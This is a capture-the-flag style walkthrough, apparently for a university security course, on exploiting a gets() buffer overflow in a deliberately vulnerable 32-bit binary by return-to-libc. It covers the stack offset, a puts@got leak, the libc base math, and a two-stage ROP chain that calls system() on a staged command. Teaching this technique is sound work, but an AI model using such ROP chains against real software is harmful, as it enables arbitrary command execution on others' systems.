# Ret2Libc Practice Walkthrough

## Overview
**Vulnerability:** Stack buffer overflow via `gets()` in a 32-bit binary  
**Goal:** Leak one libc address, compute `system()`, and use the overflow to run a command  
**Style:** Meant to be solved by hand in pwndbg first, then checked against `exploit.py`

---

## What To Prove In The Debugger

Before writing the exploit, prove these four things in pwndbg:

1. The overflow reaches saved `EIP` after 24 bytes.
2. The binary has PLT stubs for `puts`, `gets`, and `exit`.
3. The `puts` GOT slot resolves to a libc pointer at runtime.
4. A second overflow can call `gets(staging)` and then `system(staging)`.

That is the whole ret2libc workflow here: control the stack, leak libc, do the math, then return with a useful string already staged.

---

## Why This Challenge Is A Real Ret2Libc

The binary gives you:

- a 12-byte local buffer inside `service()`
- an unbounded `gets(buffer)` read
- a writable global buffer named `staging`
- a small `popret()` gadget to clean the stack between chained calls
- imported PLT entries for `puts`, `gets`, and `exit`
- no imported `system()`, so you must compute it from libc

That last point matters. If `system()` were already imported, this would be a ret2plt shortcut. Here you must derive the libc base from a leak and then add the `system()` offset yourself.

---

## Step 0: Inspect The Binary

Start pwndbg and check the binary properties first:

```gdb
gdb -q ./challenge
pwndbg> checksec
pwndbg> disas service
```

What you are looking for:

- `No PIE`, so the binary’s own addresses stay fixed
- `No canary`, so the stack overflow is usable directly
- `NX enabled`, so injected shellcode is not the plan
- a `gets(buffer)` call in `service()`

If you want to sanity-check the layout outside the debugger, the build command is:

```bash
gcc challenge.c -o challenge -fno-stack-protector -no-pie -m32
```

---

## Step 1: Find The Offset By Hand

You do not need the script to discover the offset. Use a cyclic pattern and let pwndbg tell you where `EIP` lands.

```gdb
pwndbg> cyclic 100
pwndbg> run
```

When the program asks for input, paste the pattern that `cyclic` printed. After the crash:

```gdb
pwndbg> i r eip esp ebp
pwndbg> cyclic -l $eip
```

The result should be 24 bytes. You can also reason it out from the source: 12 bytes for the buffer, 4 bytes for saved `EBP`, and 8 bytes of compiler padding/alignment gives 24 total bytes to reach saved `EIP`.

This is the first thing to verify by hand because every later payload depends on it.

---

## Step 2: Find The Useful Addresses

Now inspect the symbols the exploit needs:

```gdb
pwndbg> info functions service
pwndbg> info address service
pwndbg> info address popret
```

For PLT/GOT entries, `objdump` or `readelf` is the cleanest way to read the exact addresses:

```bash
objdump -d ./challenge | grep '<puts@plt>'
objdump -R ./challenge | grep puts
objdump -d ./challenge | grep '<gets@plt>'
objdump -d ./challenge | grep '<exit@plt>'
```

What these mean:

- `puts@plt` is the stub you jump to inside the binary
- `puts@got` is the writable slot that eventually contains the real libc address
- `gets@plt` is used to stage the command string
- `exit@plt` lets the process terminate cleanly after `system()` returns

---

## Step 3: Understand The Leak

The first stage is not magic. You are calling `puts(puts@got)`.

`puts@got` does not hold the text `puts`; it holds the resolved runtime pointer to libc’s `puts` function. When `puts` prints that memory, you get the actual address back as bytes on stdout.

In GDB, it helps to inspect the GOT entry before and after the first call:

```gdb
pwndbg> x/wx <puts_got_address>
pwndbg> vmmap
```

The important idea is simple: one libc pointer is enough. Once you know the runtime address of `puts`, the rest is just subtraction and addition.

$$
libc\_base = leaked\_puts - puts\_offset
$$

$$
system\_addr = libc\_base + system\_offset
$$

If you want the libc offsets by hand, get the libc path with `ldd ./challenge` and then query it with `nm -D`:

```bash
ldd ./challenge
nm -D /lib32/libc.so.6 | grep ' puts$'
nm -D /lib32/libc.so.6 | grep ' system$'
```

Use the libc that `ldd` shows on your machine, not a guessed one.

---

## Step 4: Build The First ROP Chain

The first payload leaks libc and returns to `service()` so you can send another round of input:

```text
[24 bytes padding]
[puts@plt]
[popret]
[puts@got]
[service]
```

Why the stack looks like that:

- `puts@plt` becomes the new instruction pointer
- the next dword is the return address for `puts`, which is `popret`
- the next dword is the argument to `puts`, which is `puts@got`
- the last dword is where execution should go after the leak, which is `service`

The `popret` gadget is there because `puts` returns with a normal cdecl stack layout. The gadget discards the leftover stack word so execution can continue cleanly.

If you want to watch it live, break after the `gets()` call in `service()`, then single-step until the return path runs:

```gdb
pwndbg> b service
pwndbg> run
pwndbg> ni
pwndbg> ni
```

After the leak prints, copy the first 4 bytes of the output and interpret them as a little-endian 32-bit address.

---

## Step 5: Compute `system()` By Hand

Once you have the leaked `puts` address, compute the libc base and then `system()`.

Example shape:

$$
leaked\_puts = 0xf7e12340
$$

$$
libc\_base = 0xf7e12340 - puts\_offset
$$

$$
system\_addr = libc\_base + system\_offset
$$

In practice, the exploit script does exactly this with the offsets from the same libc on your machine.

---

## Step 6: Stage The Command And Call `system()`

The second payload uses `gets()` to place a command string into `staging`, then calls `system(staging)`:

```text
[24 bytes padding]
[gets@plt]
[popret]
[staging]
[system_addr]
[exit@plt]
[staging]
```

The logic is:

- `gets(staging)` reads the next line of input into writable memory
- `system(staging)` executes that string
- `exit@plt` cleans up if `system()` returns

When you send this stage manually, you must send the command string immediately after the ROP payload, on the next line. For example:

```text
[second-stage payload]\ncat flag.txt\n
```

That is why `exploit.py` writes the payload and then a second newline-delimited command.

---

## Step 7: Suggested Manual pwndbg Flow

If you want the exact solve flow to practice by hand, use this order:

1. `checksec` the binary.
2. `disas service` and confirm the `gets(buffer)` call.
3. Crash it with `cyclic` and recover the offset with `cyclic -l $eip`.
4. Read `puts@plt`, `puts@got`, `gets@plt`, `exit@plt`, `service`, and `popret`.
5. Send the first ROP chain and capture the leaked `puts` pointer.
6. Compute `libc_base` and `system_addr` from your local libc.
7. Send the second ROP chain, then the command string on the next line.

If one of those steps fails, the usual mistake is either a bad libc offset or a payload order problem on the stack.

---

## Payload Shapes

### Stage 1: Leak `puts`

```text
[24 bytes padding]
[puts@plt]
[popret]
[puts@got]
[service]
```

### Stage 2: Stage Command And Execute It

```text
[24 bytes padding]
[gets@plt]
[popret]
[staging]
[system_addr]
[exit@plt]
[staging]
```

---

## Using The Script

The script is just the automated version of the manual steps above.

### Compile The Binary

```bash
cd /home/jbenjam7/cs466/ctf/14-ret2libc-practice
gcc challenge.c -o challenge -fno-stack-protector -no-pie -m32
```

### Run The Exploit

```bash
python3 exploit.py
```

### Run A Different Command

```bash
python3 exploit.py --command "ls -la"
```

---

## Common Mistakes

- Forgetting that the first leak is a raw libc pointer, not a string.
- Using the wrong libc offsets for the installed environment.
- Swapping the stack order for `puts@plt`, the return address, and the argument.
- Forgetting that the second-stage command must be sent after `gets(staging)` starts.
- Assuming the same addresses will work if the binary is rebuilt differently.

---

## One-Line Takeaway

Ret2libc is stack control plus libc math: leak one function pointer, compute the base, then call `system()` with a string you staged yourself.
